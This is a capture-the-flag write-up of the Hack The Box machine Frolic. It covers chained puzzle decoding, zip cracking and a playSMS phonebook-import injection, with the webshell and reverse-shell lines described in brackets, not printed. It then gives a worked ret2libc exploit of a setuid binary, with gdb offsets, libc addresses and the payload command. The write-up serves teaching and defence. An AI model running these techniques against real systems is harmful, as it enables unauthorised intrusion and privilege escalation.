---
layout: post
title: "The Long Way to a Short Word"
subtitle: "HTB Frolic, where a scavenger hunt through esolangs and zip files coughs up a password, and a tiny setuid binary returns you straight into libc as root"
date: 2019-03-30 12:00:00 +0000
description: "A puzzle box that makes you decode your way to a login, then ends on a clean ret2libc that turns a four-line C program into root."
image: /assets/og/the-long-way-to-a-short-word.png
tags: [hackthebox, writeup]
---

Frolic is a treasure hunt that pretends to be a hack. Most of the box is enumeration dressed as a riddle, a chain of breadcrumbs where every clue is encoded in some way designed to waste an afternoon. You decode an esoteric language into a word, crack a zip into another file, peel hex off that file to reveal base64, and the base64 is yet another esoteric language that prints one more word. At the end of all that ceremony the prize is a single short password. Then the box drops the costume entirely and hands you a real lesson: a tiny setuid binary sitting in a user's home folder that crumbles to the oldest memory trick in the book. The riddles are the bouncer. The buffer overflow is the door.

```
        F R O L I C
        ===========
        login.js   →   a password left in plain sight
             |
        Ook! Ook?  →   esolang that prints one word
             |
        base64 → zip → hex → base64 → brainfuck
             |             (clues all the way down)
             v
        a four-line word unlocks playSMS.
        upload a contact list. it runs your shell.
        then a little binary returns you into libc as root.
                                            謎
```

## 0x01 · the four-door foyer

`nmap -sC -sV` comes back with a Linux host that has clearly been arranged for you, not against you. SSH on 22, Samba on 139 and 445, and two web servers parked on strange high ports.

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu
139/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
1880/tcp open  http        Node.js (Node-RED, login required)
9999/tcp open  http        nginx 1.10.3
```

SMB offers nothing anonymous, and Node-RED on 1880 wants a login we do not have yet. That leaves nginx on 9999, which greets you with a cheerful "Welcome to nginx!" and a hint that the real content lives elsewhere. This is the box telling you where to dig. Everything interesting on Frolic is a directory you have to find, so the whole first act is a `gobuster` run that keeps spawning more `gobuster` runs.

## 0x02 · the password on the welcome mat

Bust the web root and a small village of directories appears: `/admin`, `/test`, `/dev`, `/backup`, `/loop`, and one random-looking folder named like someone fell on the keyboard, `/asdiSIAJJ0QWE9JAS`. Work them in order.

`/admin` is a login form, and the form ships its own bouncer's notebook. Read the page source, follow `login.js`, and the credentials are sitting right there in the JavaScript.

```
$ curl -s http://10.10.10.111:9999/admin/js/login.js
... if (username == "admin" && password == "superduperlooperpassword_lol") ...
```

A client-side login check is a lock with the key taped to its own front. Think of it like a nightclub that emails you the guest list and asks you to confirm whether your own name is on it. The check runs on your machine, with your eyes on the answer, so the answer was never a secret. Log in and you land on a success page full of garbage punctuation.

## 0x03 · ook, ook, the language of apes

That success page is not corrupted. It is a program. The text is nothing but periods, exclamation points, and question marks in clumps, which is the unmistakable shape of Ook!, a brainfuck dialect whose entire vocabulary is `Ook.`, `Ook!`, and `Ook?`. Picture a language with three words and the patience of a saint, where moving one step or adding one to a number takes a whole sentence. It is real, it runs, and it is deliberately exhausting to read.

Feed the blob to an Ook! interpreter and it prints a single word.

```
merrymaking
```

Hold that. It does not open the next door yet, but Frolic loves to make you carry things.

## 0x04 · a zip wearing a base64 coat

The keyboard-mash directory, `/asdiSIAJJ0QWE9JAS`, serves a wall of base64. Decode it and the magic bytes give the game away immediately: `PK`, the signature of a zip archive.

```
$ curl -s http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ | base64 -d > iceberg.zip
$ file iceberg.zip
iceberg.zip: Zip archive data
```

The zip is password protected, but a hunt box rarely uses a hard password. `fcrackzip` against `rockyou` cracks it in a blink.

```
$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt iceberg.zip
PASSWORD FOUND!!!!: pw == password
```

Inside is an `index.php` that is itself another puzzle. It is a long string of hex, and Frolic is just nesting envelopes now. Reverse the hex back to bytes and you get base64. Decode that and you get brainfuck. Run the brainfuck and you get one more word.

```
$ cat index.php | xxd -r -p | base64 -d
[ brainfuck source ]   →   idkwhatispass
```

`idkwhatispass`. The name is a wink. Somebody could not think of a password, so they typed a sentence about not knowing the password, which is exactly the kind of honesty that ends careers.

## 0x05 · the contact list that ran a command

The `/dev` trail and a backup note point at the real application, playSMS, a PHP SMS gateway living under `/playsms`. We finally have a login that fits a real lock: `admin` with the bled word `idkwhatispass`. It works.

playSMS 1.4 carries a clean authenticated bug. The phonebook import feature lets you upload a CSV of contacts, and the importer trusts the data in a way it should not. The contact fields end up rendered through a template engine, so a row that contains PHP gets executed rather than stored. Here is the elegant part of the abuse: drop a one-line handler in a field that simply runs whatever arrives in the `User-Agent` header, then make every later request carry your command in that header.

```
Name,Mobile,Email,Group code,Tags
<?php [ one-line webshell: run the system command from the User-Agent header ] ?>,2,,,
```

I am describing the row rather than printing it, and that restraint is the whole point. A working playSMS template-injection line is a textbook backdoor, and the second it touches disk a decent scanner flags the file as malware, which is the loudest possible argument for how dangerous it is. So picture it. The mechanism is a clerk who files your business card into a binder, except this binder reads anything you wrote in the "company" box out loud to the kitchen, and the kitchen does it.

Import the list, then send one request with your reverse shell tucked into the User-Agent.

```
User-Agent: [ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]
```

A listener catches it and you are on the box as `www-data`, the low-privilege identity nginx and PHP run under.

```
$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.111
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /home/ayush/user.txt
████████████████████████████████
```

## 0x06 · a small binary with a big mistake

The puzzles are over. The privesc is a single file. Hunt for setuid programs and one stands out, tucked away in a user's hidden folder, owned by root with the magic bit set.

```
$ find / -perm -4000 2>/dev/null
...
/home/ayush/.binary/rop
```

The name `rop` is not subtle. Run it and it just echoes your argument back, which is the unmistakable shape of a program that copies your input into a fixed-size buffer and never checks the length. Send it a long enough string and you scribble past the end of that buffer, over the saved return address, and you get to choose where the function returns when it finishes.

Think of a function call like a coat check. When you walk in, the program writes down on a little ticket where you came from so it can send you back there afterward. A buffer overflow lets you rub out that ticket and write a different address. When the function ends, the program reads your forged ticket and walks wherever you told it to.

The binary has the no-execute protection on, so we cannot just write shellcode into the buffer and jump to it. The stack is off limits as a launch pad. That is what return-to-libc is for. Instead of supplying new code, you point the forged return address at code that is already loaded, the C library that every program drags along, and specifically at its `system()` function. You hand `system()` the string `/bin/sh`, which also already exists inside libc, and you let the program's own toolbox open a shell for you. Picture breaking into a kitchen that has locked away all the knives you brought, then realizing the kitchen is already full of knives.

First find the offset to the return address. Hammer the binary with a cyclic pattern in `gdb` and watch where it crashes.

```
gdb-peda$ pattern_create 100
gdb-peda$ run AAAA...
EIP: 0x6c41416b
gdb-peda$ pattern_offset 0x6c41416b
52
```

Fifty-two bytes of padding, then the return address. Now collect the three libc pieces. ASLR is disabled on this box, so the addresses hold still between runs, which is the whole reason this works as cleanly as it does.

```
$ ldd rop | grep libc            # base   0xb7e19000
$ readelf -s libc.so.6 | grep system   # +0x0003ada0
$ readelf -s libc.so.6 | grep exit     # +0x0002e9d0
$ strings -a -t x libc.so.6 | grep /bin/sh   # +0x15ba0b
```

Add the offsets to the base and you have three live addresses: `system`, a clean `exit` so the shell tears down without a crash, and the `/bin/sh` string. Lay them after the padding in that order. The classic ret2libc frame is just "go to system, then go to exit when you are done, and here is the argument for system."

```
[ 52 bytes padding ][ &system ][ &exit ][ &"/bin/sh" ]
```

Wrap it as the argument and the setuid bit does the rest. Because `rop` runs as root, the shell it spawns is born as root.

```
$ ./rop $(python -c 'print "a"*52 + p_system + p_exit + p_binsh')
# id
uid=0(root) gid=33(www-data) groups=33(www-data)
# cat /root/root.txt
████████████████████████████████
```

## 0x07 · the honest caveat

Frolic looks like two different boxes glued together, and in a sense it is, but they rhyme. The whole front half is one mistake repeated in costume after costume. A secret that has to reach the user is not a secret. The login check ran in the browser, so the password was already in the reader's hands. The clues were encoded, never encrypted, and encoding is not a lock. It is a language you have not learned yet. Ook!, base64, hex, a zip with a `rockyou` password, every layer felt like security and not one of them kept anyone out for longer than it took to recognize the format. Obfuscation buys you the seconds it takes the attacker to say "oh, that is just base64."

The back half is the part worth losing sleep over, and it is not the exploit technique. Ret2libc is decades old and the mitigations that defang it, full ASLR and a hardened libc, are switches you flip once. The real wound is a setuid root binary that takes attacker input and copies it without measuring it. That program was trusted with the crown because someone wanted a quick way to do a privileged task, and it handed the crown to anyone who could type a long enough string. You can patch the kernel and pin every library and still lose to one program that was given root and never taught to count. The lock on the front door does not matter when the safe inside trusts whatever you whisper to it.

## 0x08 · outro

```
they hid the password behind a language with three words,
behind a zip, behind hex, behind base64, behind another language.
none of it was locked. all of it was just dressed up.

then a tiny program with root's blessing forgot how long a string can be,
and the box returned, politely, into its own library, as root.

decode the costume. measure the buffer. wear black.

                                                            EOF
```

---

*HTB: Frolic, retired 23 March 2019. An easy Linux box that spends most of its length as a scavenger hunt and then redeems itself with a textbook ret2libc. Every clue was a costume, and the only real lock was a buffer nobody measured.*